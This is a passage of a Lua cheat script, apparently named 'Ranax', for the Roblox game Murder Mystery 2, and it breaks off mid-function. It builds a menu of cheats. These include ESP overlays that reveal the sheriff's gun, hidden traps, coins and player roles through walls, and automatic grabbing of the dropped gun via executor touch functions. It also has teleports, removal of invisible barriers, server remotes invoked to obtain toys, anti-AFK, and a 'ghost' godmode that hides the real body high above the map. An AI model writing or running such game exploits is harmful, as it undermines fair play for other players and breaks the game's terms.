        getgenv().NameESPRoundStartConnection = RoundStartEvent.OnClientEvent:Connect(function()
            getgenv().NameRoles = {}
            for plr, esp in pairs(getgenv().NameESPObjects) do
                UpdateNameESP(plr, esp)
            end
        end)
        
        for _, player in ipairs(Players:GetPlayers()) do
            SetupPlayer(player)
        end
        
        getgenv().NameESPPlayerAdded = Players.PlayerAdded:Connect(SetupPlayer)
        getgenv().NameESPPlayerRemoving = Players.PlayerRemoving:Connect(function(player)
            if getgenv().NameESPObjects[player] then
                pcall(function() getgenv().NameESPObjects[player]:Destroy() end)
                getgenv().NameESPObjects[player] = nil
            end
        end)
        
        getgenv().NameESPRefreshLoop = task.spawn(function()
            while true do
                task.wait(1.0)
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer then
                        local esp = getgenv().NameESPObjects[player]
                        if not esp or not esp.Parent or not esp.Adornee or not esp.Adornee.Parent then
                            CreateNameESP(player)
                        else
                            UpdateNameESP(player, esp)
                        end
                    end
                end
            end
        end)
    end
})

ESPTab:Divider()

GunDropToggle = ESPTab:Toggle({
    Title = "Gun Drop ESP",
    Desc = "Highlights dropped Sheriff gun with prominent 'Sheriff Gun' text & distance",
    Icon = "bow-arrow",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        local GunHighlight = nil
        local GunBillboard = nil
        local DistConn = nil

        local function cleanupGunESP()
            if GunHighlight then
                pcall(function() GunHighlight:Destroy() end)
                GunHighlight = nil
            end
            if GunBillboard then
                pcall(function() GunBillboard:Destroy() end)
                GunBillboard = nil
            end
            if DistConn then
                pcall(function() DistConn:Disconnect() end)
                DistConn = nil
            end
        end

        local function applyGunESP(targetPart)
            if not targetPart or not targetPart.Parent then return end
            cleanupGunESP()

            -- 1. Radiant Golden-Yellow Sheriff Highlight
            local hl = Instance.new("Highlight")
            hl.Name = "SheriffGunHighlight"
            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            hl.FillTransparency = 0.25
            hl.OutlineTransparency = 0
            hl.FillColor = Color3.fromRGB(255, 215, 0)      -- Sheriff Gold
            hl.OutlineColor = Color3.fromRGB(255, 255, 255)  -- Crisp White Outline
            hl.Adornee = targetPart
            hl.Parent = targetPart
            GunHighlight = hl

            -- 2. Prominent "Sheriff Gun" Billboard (Biraz Büyük & Belirgin)
            local bb = Instance.new("BillboardGui")
            bb.Name = "SheriffGunBillboard"
            bb.AlwaysOnTop = true
            bb.Size = UDim2.new(0, 220, 0, 54)
            bb.StudsOffset = Vector3.new(0, 3.2, 0)
            bb.LightInfluence = 0
            bb.MaxDistance = 3500
            bb.Adornee = targetPart
            bb.Parent = targetPart
            GunBillboard = bb

            local title = Instance.new("TextLabel")
            title.Name = "Title"
            title.Size = UDim2.new(1, 0, 0, 28)
            title.Position = UDim2.new(0, 0, 0, 0)
            title.BackgroundTransparency = 1
            title.Font = Enum.Font.GothamBold
            title.Text = "★ Sheriff Gun ★"
            title.TextColor3 = Color3.fromRGB(255, 225, 50) -- Glowing Sheriff Gold
            title.TextSize = 22                             -- Biraz Büyük font boyutu
            title.TextStrokeTransparency = 0
            title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0) -- Solid black stroke
            title.Parent = bb

            local distLabel = Instance.new("TextLabel")
            distLabel.Name = "Distance"
            distLabel.Size = UDim2.new(1, 0, 0, 20)
            distLabel.Position = UDim2.new(0, 0, 0, 28)
            distLabel.BackgroundTransparency = 1
            distLabel.Font = Enum.Font.GothamMedium
            distLabel.Text = "[0 studs]"
            distLabel.TextColor3 = Color3.fromRGB(235, 240, 255)
            distLabel.TextSize = 14
            distLabel.TextStrokeTransparency = 0
            distLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            distLabel.Parent = bb

            -- Live distance updater
            DistConn = RunService.RenderStepped:Connect(function()
                if not targetPart or not targetPart.Parent or not bb.Parent then
                    cleanupGunESP()
                    return
                end
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local d = math.floor((hrp.Position - targetPart.Position).Magnitude)
                    distLabel.Text = string.format("[%d studs]", d)
                end
            end)

            targetPart.Destroying:Connect(function()
                cleanupGunESP()
            end)
        end

        local function checkObjectForGun(obj)
            if not obj then return end
            if obj.Name == "GunDrop" then
                local p = obj:IsA("BasePart") and obj or obj:FindFirstChildWhichIsA("BasePart")
                if p then applyGunESP(p) end
            elseif obj:IsA("BasePart") and obj.Name:lower():find("gundrop") then
                applyGunESP(obj)
            end
        end

        if state then
            -- Find currently spawned GunDrop
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if obj.Name == "GunDrop" or (obj:IsA("BasePart") and obj.Name:lower():find("gundrop")) then
                    checkObjectForGun(obj)
                    break
                end
            end

            local conn = Workspace.DescendantAdded:Connect(checkObjectForGun)
            getgenv().GunDropDescendantAddedConnection = conn
        else
            if getgenv().GunDropDescendantAddedConnection then
                pcall(function() getgenv().GunDropDescendantAddedConnection:Disconnect() end)
                getgenv().GunDropDescendantAddedConnection = nil
            end
            cleanupGunESP()
        end
    end
})

TrapESPToggle = ESPTab:Toggle({
    Title = "Allows you to see traps",
    Desc = "Self-Explanatory",
    Icon = "shield-check",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        local OriginalTransparencies = {}
        local DescendantAddedConnection = nil
        local DescendantRemovingConnection = nil
        
        local function onTrapAdded(trap)
            if trap.Name ~= "TrapVisual" or not trap:IsA("BasePart") then return end
            
            OriginalTransparencies[trap] = trap.Transparency
            trap.Transparency = 0
        end
        
        local function onTrapRemoving(trap)
            OriginalTransparencies[trap] = nil
        end
        
        if state then
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if obj.Name == "TrapVisual" and obj:IsA("BasePart") then
                    onTrapAdded(obj)
                end
            end
            
            DescendantAddedConnection = Workspace.DescendantAdded:Connect(onTrapAdded)
            DescendantRemovingConnection = Workspace.DescendantRemoving:Connect(onTrapRemoving)
            
            TrapESPToggle.DescendantAddedConnection = DescendantAddedConnection
            TrapESPToggle.DescendantRemovingConnection = DescendantRemovingConnection
            TrapESPToggle.OriginalTransparencies = OriginalTransparencies
        else
            if TrapESPToggle.DescendantAddedConnection then
                TrapESPToggle.DescendantAddedConnection:Disconnect()
            end
            if TrapESPToggle.DescendantRemovingConnection then
                TrapESPToggle.DescendantRemovingConnection:Disconnect()
            end
            
            if TrapESPToggle.OriginalTransparencies then
                for trap, transparency in pairs(TrapESPToggle.OriginalTransparencies) do
                    if trap and trap.Parent then
                        trap.Transparency = transparency
                    end
                end
            end
            
            TrapESPToggle.DescendantAddedConnection = nil
            TrapESPToggle.DescendantRemovingConnection = nil
            TrapESPToggle.OriginalTransparencies = {}
        end
    end
})

ESPTab:Divider()

UIElements.ESPCoinToggle = ESPTab:Toggle({
    Title = "Coin ESP",
    Desc = "Highlights all spawned coins and displays distance through walls",
    Icon = "coins",
    Type = "Checkbox",
    Value = _G.CoinESPEnabled or false,
    Callback = function(state)
        _G.CoinESPEnabled = state
        if typeof(_G.RanaxUpdateWorkspaceCoinWatchers) == "function" then _G.RanaxUpdateWorkspaceCoinWatchers() end
        if typeof(_G.RanaxUpdateCoinDistListener) == "function" then _G.RanaxUpdateCoinDistListener(state) end
        if typeof(_G.toggleCoinESP) == "function" then
            _G.toggleCoinESP(state)
        end
        if UIElements.CoinESPToggle and UIElements.CoinESPToggle.SetValue then
            pcall(function() UIElements.CoinESPToggle:SetValue(state) end)
        end
        notify("Coin ESP", "Coin ESP " .. (state and "Enabled" or "Disabled"), 2, "coins")
    end
})
-------------------------------------------------------------------------------------------------------------------
task.wait()
local MiscTab = Window:Tab({
    Title = "Miscellaneous",
    Icon = "server",
    Locked = false,
})

-- ==================== GRAB GUN SYSTEM ====================
local function grabDroppedGun()
    local char = LocalPlayer.Character
    if not char then return false, "No character" end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false, "No HumanoidRootPart" end

    -- Check if we are murderer (don't grab gun if we have knife)
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Tool") and item.Name:lower():find("knife") then
            return false, "Murderer cannot grab gun"
        end
    end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then
        for _, item in ipairs(bp:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower():find("knife") then
                return false, "Murderer cannot grab gun"
            end
        end
    end

    -- Already have gun?
    if (char:FindFirstChild("Gun") or (bp and bp:FindFirstChild("Gun"))) then
        return true, "Already holding gun"
    end

    local gunDrop = Workspace:FindFirstChild("GunDrop", true)
    if not gunDrop then
        return false, "No dropped gun on map"
    end

    pcall(function()
        for _, part in pairs(gunDrop:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 1
                pcall(function()
                    if typeof(firetouchinterest) == "function" then
                        firetouchinterest(hrp, part, 0)
                        firetouchinterest(hrp, part, 1)
                    end
                end)
            elseif part.Name:lower():find("fire") or part.Name:lower():find("flame") then
                part:Destroy()
            end
        end
        if gunDrop:IsA("BasePart") then
            pcall(function()
                if typeof(firetouchinterest) == "function" then
                    firetouchinterest(hrp, gunDrop, 0)
                    firetouchinterest(hrp, gunDrop, 1)
                end
            end)
        end
        gunDrop:PivotTo(hrp.CFrame)
    end)
    return true, "Gun grabbed!"
end

local GrabGunButton = MiscTab:Button({
    Title = "Grab Gun",
    Desc = "Teleports dropped Sheriff gun to your character",
    Locked = false,
    Callback = function()
        local ok, msg = grabDroppedGun()
        if ok then
            notify("Grab Gun", msg, 2, "check")
        else
            notify("Grab Gun", msg, 2, "x")
        end
    end
})

local GrabGunKeybind
GrabGunKeybind = MiscTab:Keybind({
    Title = "Grab Gun Keybind",
    Desc = "Keybind to grab dropped gun (Press Delete for None)",
    Value = KeybindValues.GrabGunKeybind or "None",
    Callback = function(v)
        KeybindValues.GrabGunKeybind = tostring(v):gsub("Enum.KeyCode.", "")
        if tostring(v) == "Delete" or tostring(v) == "Backspace" or tostring(v) == "None" or v == nil then
            pcall(function() if GrabGunKeybind and GrabGunKeybind.SetValue then GrabGunKeybind:SetValue("None") end end)
            return
        end
        local ok, msg = grabDroppedGun()
        if ok then
            notify("Grab Gun", msg, 2, "check")
        else
            notify("Grab Gun", msg, 2, "x")
        end
    end
})
UIElements.GrabGunKeybind = GrabGunKeybind

AutoGrabGunToggle = MiscTab:Toggle({
    Title = "Auto Grab Gun",
    Desc = "Automatically grabs the Sheriff gun whenever it drops",
    Icon = "circle-star",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        getgenv().AutoGrabGunActive = state
        if state then
            -- 1) Immediate grab attempt
            grabDroppedGun()
            
            -- 2) Fast reactive event listener
            if getgenv().AutoGrabGunConnection then
                getgenv().AutoGrabGunConnection:Disconnect()
            end
            getgenv().AutoGrabGunConnection = Workspace.DescendantAdded:Connect(function(obj)
                if not getgenv().AutoGrabGunActive then return end
                if obj.Name == "GunDrop" or (obj.Parent and obj.Parent.Name == "GunDrop") then
                    task.wait(0.04)
                    grabDroppedGun()
                end
            end)

            -- 3) Unstoppable 0.25s active poll thread (ensures 100% catch rate like manual button)
            if getgenv().AutoGrabGunThread then
                pcall(task.cancel, getgenv().AutoGrabGunThread)
            end
            getgenv().AutoGrabGunThread = task.spawn(function()
                while getgenv().AutoGrabGunActive do
                    task.wait(0.25)
                    local char = LocalPlayer.Character
                    local bp = LocalPlayer:FindFirstChild("Backpack")
                    local hasGun = (char and char:FindFirstChild("Gun")) or (bp and bp:FindFirstChild("Gun"))
                    local hasKnife = (char and char:FindFirstChild("Knife")) or (bp and bp:FindFirstChild("Knife"))
                    if not hasGun and not hasKnife then
                        local gunDrop = Workspace:FindFirstChild("GunDrop", true)
                        if gunDrop then
                            grabDroppedGun()
                        end
                    end
                end
            end)
            notify("Misc", "Auto Grab Gun: ON", 2, "circle-star")
        else
            if getgenv().AutoGrabGunConnection then
                getgenv().AutoGrabGunConnection:Disconnect()
                getgenv().AutoGrabGunConnection = nil
            end
            if getgenv().AutoGrabGunThread then
                pcall(task.cancel, getgenv().AutoGrabGunThread)
                getgenv().AutoGrabGunThread = nil
            end
            notify("Misc", "Auto Grab Gun: OFF", 2)
        end
    end
})
MiscTab:Divider()

-- ==================== AUTO CHAT SYSTEM ====================
MiscTab:Section({
    Title = "Auto Chat System",
    TextSize = 15
})

UIElements.AutoChatMurdDeathToggle = MiscTab:Toggle({
    Title = "Auto Chat on Murderer Death",
    Desc = "Sends custom chat message when Murderer dies / eliminated",
    Icon = "message-square",
    Type = "Checkbox",
    Value = _G.AutoChatMurdDeath or false,
    Callback = function(state)
        _G.AutoChatMurdDeath = state
        notify("Auto Chat", "Murderer Death Chat: " .. (state and "ON" or "OFF"), 2, "message-square")
    end
})

UIElements.AutoChatMurdDeathMsgInput = MiscTab:Input({
    Title = "Murderer Death Message",
    Desc = "Message sent to chat when Murderer dies (default: ez)",
    Icon = "message-circle",
    Placeholder = "ez",
    Value = _G.AutoChatMurdDeathMsg or "ez",
    Callback = function(val)
        val = tostring(val or ""):match("^%s*(.-)%s*$")
        if val and val ~= "" then
            _G.AutoChatMurdDeathMsg = val
            notify("Auto Chat", "Death Message: " .. val, 2, "message-circle")
        end
    end
})

UIElements.AutoChatKillToggle = MiscTab:Toggle({
    Title = "Auto Chat on Kill",
    Desc = "Sends custom chat message when you eliminate someone",
    Icon = "swords",
    Type = "Checkbox",
    Value = _G.AutoChatKill or false,
    Callback = function(state)
        _G.AutoChatKill = state
        notify("Auto Chat", "Kill Chat: " .. (state and "ON" or "OFF"), 2, "swords")
    end
})

UIElements.AutoChatKillMsgInput = MiscTab:Input({
    Title = "Kill Message",
    Desc = "Message sent to chat when you eliminate a target (default: ez)",
    Icon = "crosshair",
    Placeholder = "ez",
    Value = _G.AutoChatKillMsg or "ez",
    Callback = function(val)
        val = tostring(val or ""):match("^%s*(.-)%s*$")
        if val and val ~= "" then
            _G.AutoChatKillMsg = val
            notify("Auto Chat", "Kill Message: " .. val, 2, "crosshair")
        end
    end
})

MiscTab:Button({
    Title = "Test Chat Message",
    Desc = "Sends the current Murderer Death message to test chat connection",
    Icon = "send",
    Locked = false,
    Callback = function()
        local msg = _G.AutoChatMurdDeathMsg or "ez"
        sendRobloxChatMessage(msg)
        notify("Auto Chat", "Test sent: " .. msg, 2, "send")
    end
})

MiscTab:Divider()

local TeleportLobby = MiscTab:Button({
    Title = "Teleport to Lobby",
    Desc = "Teleports you to the Lobby",
    Locked = false,
    Callback = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")
        
        local map = (typeof(getActiveMapModel) == "function" and getActiveMapModel()) or workspace:FindFirstChild("Normal")
        local spawnsModel = map and map:FindFirstChild("Spawns")
        if not spawnsModel then
            for _, obj in ipairs(Workspace:GetChildren()) do
                if obj:IsA("Model") and obj.Name ~= "Lobby" and obj.Name ~= "RegularLobby" and obj.Name ~= "Terrain" then
                    local sp = obj:FindFirstChild("Spawns")
                    if sp and sp:IsA("Model") then spawnsModel = sp; break end
                end
            end
        end
        
        if not spawnsModel then
            return
        end
        
        local spawnPoints = {}
        for _, obj in ipairs(spawnsModel:GetDescendants()) do
            if obj.Name == "Spawn" and obj:IsA("BasePart") then
                table.insert(spawnPoints, obj)
            end
        end
        
        if #spawnPoints > 0 then
            local randomSpawn = spawnPoints[math.random(1, #spawnPoints)]
            hrp.CFrame = randomSpawn.CFrame + Vector3.new(0, 5, 0)
        end
    end
})

local TeleportMap = MiscTab:Button({
    Title = "Teleport to Map",
    Desc = "Teleports you to the map",
    Locked = false,
    Callback = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")
        
        local spawnsModel = nil
        
        local map = (typeof(getActiveMapModel) == "function" and getActiveMapModel()) or workspace:FindFirstChild("Normal")
        spawnsModel = map and map:FindFirstChild("Spawns")
        if not spawnsModel then
            for _, obj in ipairs(Workspace:GetChildren()) do
                if obj:IsA("Model") and obj.Name ~= "Lobby" and obj.Name ~= "RegularLobby" and obj.Name ~= "Terrain" then
                    local sp = obj:FindFirstChild("Spawns")
                    if sp and sp:IsA("Model") then spawnsModel = sp; break end
                end
            end
        end
        
        if not spawnsModel then
            return
        end
        
        local spawnPoints = {}
        for _, obj in ipairs(spawnsModel:GetDescendants()) do
            if obj.Name == "Spawn" and obj:IsA("BasePart") then
                table.insert(spawnPoints, obj)
            end
        end
        
        if #spawnPoints > 0 then
            local randomSpawn = spawnPoints[math.random(1, #spawnPoints)]
            hrp.CFrame = randomSpawn.CFrame + Vector3.new(0, 5, 0)
        end
    end
})

MiscTab:Divider()

local BarrierRemoverButton = MiscTab:Button({
    Title = "Remove Barriers",
    Desc = "Removes any invisible walls / barriers",
    Locked = false,
    Callback = function()
        if not getgenv().BarrierModifiedParts then
            getgenv().BarrierModifiedParts = {}
        end
        
        local function IsWall(obj)
            return math.abs(obj.CFrame.UpVector.Y) < 0.5
        end
        
        local map = (typeof(getActiveMapModel) == "function" and getActiveMapModel()) or workspace:FindFirstChild("Normal")
        local scanList = map and map:GetDescendants() or workspace:GetChildren()
        for _, obj in pairs(scanList) do
            if obj:IsA("BasePart") and not obj:IsA("TrussPart") then
                if obj.Name == "GlitchProof" then
                    if not getgenv().BarrierModifiedParts[obj] then
                        getgenv().BarrierModifiedParts[obj] = obj.CanCollide
                    end
                    obj.CanCollide = false
                elseif obj.Transparency == 1 and IsWall(obj) then
                    if not getgenv().BarrierModifiedParts[obj] then
                        getgenv().BarrierModifiedParts[obj] = obj.CanCollide
                    end
                    obj.CanCollide = false
                end
            end
        end
    end
})

RemoveBarrierAutomaticToggle = MiscTab:Toggle({
    Title = "Automatic Remove Barriers",
    Desc = "Removes barriers / invisible walls automatically",
    Icon = "brick-wall-shield",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if not getgenv().BarrierModifiedParts then
            getgenv().BarrierModifiedParts = {}
        end
        
        local function IsWall(obj)
            return math.abs(obj.CFrame.UpVector.Y) < 0.5
        end
        
        local function ProcessObject(obj)
            if obj:IsA("BasePart") and not obj:IsA("TrussPart") then
                if obj.Name == "GlitchProof" then
                    if not getgenv().BarrierModifiedParts[obj] then
                        getgenv().BarrierModifiedParts[obj] = obj.CanCollide
                    end
                    obj.CanCollide = false
                    return
                end
                
                if obj.Transparency == 1 and IsWall(obj) then
                    if not getgenv().BarrierModifiedParts[obj] then
                        getgenv().BarrierModifiedParts[obj] = obj.CanCollide
                    end
                    obj.CanCollide = false
                end
            end
        end
        
        if state then
            if getgenv().BarrierDescendantConnection then
                getgenv().BarrierDescendantConnection:Disconnect()
                getgenv().BarrierDescendantConnection = nil
            end
            
            for _, obj in pairs(Workspace:GetDescendants()) do
                ProcessObject(obj)
            end

            getgenv().BarrierDescendantConnection = Workspace.DescendantAdded:Connect(ProcessObject)
        else
            if getgenv().BarrierDescendantConnection then
                getgenv().BarrierDescendantConnection:Disconnect()
                getgenv().BarrierDescendantConnection = nil
            end
            
            for part, originalCollisionState in pairs(getgenv().BarrierModifiedParts) do
                if part and part.Parent then
                    part.CanCollide = originalCollisionState
                end
            end
            
            getgenv().BarrierModifiedParts = {}
        end
    end
})

MiscTab:Divider()

_G.TryhardToolsEnabled = false

local function giveTools()
    pcall(function()
        local extras = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Extras")
        local ReplicateToy = extras and extras:FindFirstChild("ReplicateToy")
        if not ReplicateToy then
            local r = ReplicatedStorage:FindFirstChild("Remotes") or ReplicatedStorage
            local e = r:FindFirstChild("Extras") or r
            ReplicateToy = e:FindFirstChild("ReplicateToy")
        end
        if ReplicateToy then
            -- Order: Gold Bomb → Normal Bomb → GG Sign → Spray Paint
            pcall(function() ReplicateToy:InvokeServer("GoldBomb") end)
            pcall(function() ReplicateToy:InvokeServer("FakeBomb") end)
            pcall(function() ReplicateToy:InvokeServer("GGSign") end)
            pcall(function() ReplicateToy:InvokeServer("SprayPaint") end)
            pcall(function() ReplicateToy:InvokeServer("Spray") end)
            pcall(function() ReplicateToy:InvokeServer("SprayCan") end)
            pcall(function() ReplicateToy:InvokeServer("PaintCan") end)
            local toyNames = {
                "GoldBomb",
                "Bomb", "NormalBomb", "PrankBomb", "DefaultBomb",
                "RegularBomb", "ClassicBomb", "ToyBomb", "TimeBomb", "FakeC4", "FakeBomb",
                "GGSign",
                "SprayPaint", "Spray", "SprayCan", "PaintCan", "Graffiti",
            }
            for _, tName in ipairs(toyNames) do
                pcall(function() ReplicateToy:InvokeServer(tName) end)
            end
        end

        -- Check PlayEmote fallback for spraypaint
        pcall(function()
            local gp = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("Gameplay")
            local playEmote = gp and (gp:FindFirstChild("PlayEmote") or gp:FindFirstChild("Emote"))
            if playEmote then
                playEmote:FireServer("spraypaint")
                playEmote:FireServer("spray")
            end
        end)

        -- ReplicatedStorage fallback: clone bomb/spray paint if not in bag
        local bp = LocalPlayer:FindFirstChild("Backpack")
        local char = LocalPlayer.Character
        local function alreadyHasTool(keyword)
            for _, item in ipairs((bp and bp:GetChildren()) or {}) do
                if item:IsA("Tool") and item.Name:lower():find(keyword) then return true end
            end
            for _, item in ipairs((char and char:GetChildren()) or {}) do
                if item:IsA("Tool") and item.Name:lower():find(keyword) then return true end
            end
            return false
        end

        if bp then
            if not alreadyHasTool("bomb") then
                for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
                    if obj:IsA("Tool") and obj.Name:lower():find("bomb") then
                        pcall(function()
                            local cl = obj:Clone()
                            cl.Parent = bp
                        end)
                        break
                    end
                end
            end
            if not alreadyHasTool("spray") and not alreadyHasTool("paint") then
                for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
                    if obj:IsA("Tool") and (obj.Name:lower():find("spray") or obj.Name:lower():find("paint")) then
                        pcall(function()
                            local cl = obj:Clone()
                            cl.Parent = bp
                        end)
                        break
                    end
                end
            end
        end
    end)
end

-- ===================== SPRAY PAINT AUTO-CONFIG =====================
-- Equips spray paint tool → waits for MM2 Decal GUI → fills ID → clicks Add
if not _G.RanaxSprayDecalID or _G.RanaxSprayDecalID == "" then
    _G.RanaxSprayDecalID = "225169641"
end
local function autoConfigSprayPaint()
    task.spawn(function()
        task.wait(1.2)

        -- Step 1: equip the spray paint tool to open its GUI
        local function equipSprayTool()
            local char = LocalPlayer.Character
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            local bp   = LocalPlayer:FindFirstChild("Backpack")
            if not hum then return end
            local keywords = {"spray", "paint", "graffiti"}
            -- check backpack and character
            for _, src in ipairs({ bp, char }) do
                if src then
                    for _, item in ipairs(src:GetChildren()) do
                        if item:IsA("Tool") then
                            local n = item.Name:lower()
                            for _, kw in ipairs(keywords) do
                                if n:find(kw) then
                                    pcall(function() hum:EquipTool(item) end)
                                    return
                                end
                            end
                        end
                    end
                end
            end
        end
        equipSprayTool()
        task.wait(0.6)  -- give GUI time to open

        -- Step 2: search PlayerGui for the Decal ID TextBox and Add button
        local gui = LocalPlayer:FindFirstChild("PlayerGui")
        if not gui then return end

        local idBox, addBtn
        local deadline = tick() + 10

        while tick() < deadline do
            for _, screen in ipairs(gui:GetChildren()) do
                -- skip Ranax's own UI screens
                if not (screen.Name:lower():find("ranax") or screen.Name:lower():find("nexus")) then
                    for _, desc in ipairs(screen:GetDescendants()) do
                        -- Any visible TextBox (broad match for spray paint GUI)
                        if not idBox and desc:IsA("TextBox") and desc.Visible then
                            idBox = desc
                        end
                        -- "Add" button (MM2 spray paint GUI uses "Add")
                        if not addBtn and desc:IsA("TextButton") and desc.Visible then
                            local t = desc.Text:lower()
                            local n = desc.Name:lower()
                            if t == "add" or t == "submit" or t == "apply" or t == "confirm"
                                or n:find("add") or n:find("submit") then
                                addBtn = desc
                            end
                        end
                    end
                end
            end
            if idBox and addBtn then break end
            task.wait(0.25)
        end

        if idBox then
            idBox.Text = tostring(_G.RanaxSprayDecalID or "225169641")
            -- fire FocusLost so the game registers the new text
            pcall(function() idBox.FocusLost:Fire(true) end)
            task.wait(0.1)
        end
        if addBtn then
            pcall(function() addBtn.MouseButton1Click:Fire() end)
            pcall(function() addBtn.Activated:Fire() end)
            task.wait(0.05)
            pcall(function() addBtn.MouseButton1Down:Fire() end)
            pcall(function() addBtn.MouseButton1Up:Fire() end)
        end
    end)
end

MiscTab:Toggle({
    Title = "Get Toys",
    Desc = "Gives Gold Bomb, Normal Bomb, GG Sign and Spray Paint every respawn",
    Icon = "wrench",
    Type = "Checkbox",
    Value = false,
    Callback = function(state) 
        _G.TryhardToolsEnabled = state
        if state then
            giveTools()
            autoConfigSprayPaint()
            notify("Toys", "Given Gold Bomb, Bomb, GG Sign & Spray Paint!", 2, "check")
        end
    end
})

MiscTab:Input({
    Title = "Spray Paint Decal ID",
    Desc = "Enter Decal ID for spray paint and press Enter",
    Icon = "paintbrush",
    Placeholder = "225169641",
    Value = _G.RanaxSprayDecalID,
    Callback = function(val)
        val = tostring(val or ""):match("^%s*(.-)%s*$")  -- trim whitespace
        if val and val ~= "" then
            _G.RanaxSprayDecalID = val
            notify("Spray", "Decal ID: " .. val, 2, "paintbrush")
        end
    end
})

-- ==================== ANTI-AFK UI ====================
MiscTab:Toggle({
    Title = "Anti-AFK",
    Desc = "Prevents Roblox AFK kick — sends automatic input",
    Icon = "shield",
    Type = "Checkbox",
    Value = true,
    Callback = function(state)
        _G.RanaxAntiAFK = state
        notify("Anti-AFK", "Anti-AFK " .. (state and "ON" or "OFF"), 2, "shield")
    end
})

-- ==================== GHOST / INVISIBLE GODMODE ====================
_G.RanaxGhostState = false
local RanaxGhostCharacter = nil
local RanaxRealHRP = nil
local RanaxGhostLoop = nil

local function toggleGhostMode()
    _G.RanaxGhostState = not _G.RanaxGhostState
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    RanaxRealHRP = char.HumanoidRootPart

    if _G.RanaxGhostState then
        local spawnPos = RanaxRealHRP.CFrame
        char.Archivable = true
        RanaxGhostCharacter = char:Clone()
        RanaxGhostCharacter.Name = "RANAX_GHOST"
        RanaxGhostCharacter.Parent = workspace

        for _, v in pairs(RanaxGhostCharacter:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = true
                v.Transparency = 0.35
            end
        end

        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then part.Anchored = true end
        end
        RanaxRealHRP.CFrame = CFrame.new(0, 20000, 0)

        local ghostHRP = RanaxGhostCharacter:WaitForChild("HumanoidRootPart", 2)
        if ghostHRP then ghostHRP.CFrame = spawnPos end

        local ghostHum = RanaxGhostCharacter:WaitForChild("Humanoid", 2)
        if ghostHum then
            ghostHum.WalkSpeed = 16
            ghostHum.JumpPower = 50
            ghostHum.AutoRotate = true
            local cam = workspace.CurrentCamera
            cam.CameraSubject = ghostHum
            cam.CameraType = Enum.CameraType.Custom
        end

        if RanaxGhostLoop then RanaxGhostLoop:Disconnect() end
        RanaxGhostLoop = RunService.Heartbeat:Connect(function()
            if not _G.RanaxGhostState or not RanaxGhostCharacter or not RanaxGhostCharacter.Parent then
                if RanaxGhostLoop then RanaxGhostLoop:Disconnect(); RanaxGhostLoop = nil end
                return
            end
            if RanaxRealHRP and RanaxRealHRP.Parent then
                RanaxRealHRP.Anchored = true
                RanaxRealHRP.CFrame = CFrame.new(0, 20000, 0)
            end
        end)
        notify("Ghost Mode", "Invisible Ghost Mode: ACTIVE ", 2.5, "ghost")
    else
        if RanaxGhostLoop then RanaxGhostLoop:Disconnect(); RanaxGhostLoop = nil end
        local ghostCF = CFrame.new()
        if RanaxGhostCharacter then
            local gHRP = RanaxGhostCharacter:FindFirstChild("HumanoidRootPart")
            if gHRP then ghostCF = gHRP.CFrame end
            RanaxGhostCharacter:Destroy()
            RanaxGhostCharacter = nil
        end
        local cam = workspace.CurrentCamera
        local realHum = char:FindFirstChild("Humanoid")
        if realHum then
            cam.CameraSubject = realHum
            cam.CameraType = Enum.CameraType.Custom
        end
        if RanaxRealHRP and RanaxRealHRP.Parent then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.Anchored = false end
            end
            RanaxRealHRP.CFrame = ghostCF
        end
        notify("Ghost Mode", "Ghost Mode: OFF (Returned to body)", 2)
    end
end

MiscTab:Toggle({
    Title = "Ghost Mode",
    Desc = "Real body is anchored at Y=20000 while ghost clone walks on ground",
    Icon = "ghost",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if state ~= _G.RanaxGhostState then
            toggleGhostMode()
        end
    end
})

local GhostKeybind
GhostKeybind = MiscTab:Keybind({
    Title = "Ghost Mode Keybind",
    Desc = "Toggle Ghost Mode on key press (Press Delete for None)",
    Value = KeybindValues.GhostKeybind or "None",
    Callback = function(Value)
        KeybindValues.GhostKeybind = tostring(Value):gsub("Enum.KeyCode.", "")
        if tostring(Value) == "Delete" or tostring(Value) == "Backspace" or tostring(Value) == "None" or Value == nil then
            pcall(function() if GhostKeybind and GhostKeybind.SetValue then GhostKeybind:SetValue("None") end end)
            return
        end
        toggleGhostMode()
    end,
})
UIElements.GhostKeybind = GhostKeybind

-- ==================== MM2 HUD STATUS WIDGETS ====================
local RanaxTimerGui = nil
local function toggleTimerHUD(state)
    if not state then
        if RanaxTimerGui then RanaxTimerGui:Destroy(); RanaxTimerGui = nil end
        return
    end
    if RanaxTimerGui and RanaxTimerGui.Parent then return end
    local coreOk, coreGui = pcall(function() return game:GetService("CoreGui") end)
    local targetParent = (coreOk and coreGui) or LocalPlayer:WaitForChild("PlayerGui")
    
    local sg = Instance.new("ScreenGui")
    sg.Name = "RanaxTimerHUD"
